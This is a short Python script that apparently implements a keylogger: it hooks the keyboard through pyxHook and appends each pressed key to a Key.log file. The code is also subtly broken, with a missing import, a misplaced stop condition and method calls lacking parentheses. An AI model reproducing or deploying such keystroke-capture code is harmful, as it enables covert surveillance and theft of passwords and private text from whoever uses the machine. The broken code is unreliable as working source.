import pyxHook

dir_path = os.path.dirname(os.path.realpath(__file__))

log_file = str(dir_path) + "/Key.log"

def key_pressed(event):
	fob = open(log_file, 'a')
	fob.write(event.Key)
	fob.write('\n')

if event.Ascii == 96:
	fob.close
	new_hook.cancel()

new_hook = pyxHook.HookManager()
new_hook.KeyDown = key_pressed
new_hook.HookKeyboard()
new_hook.start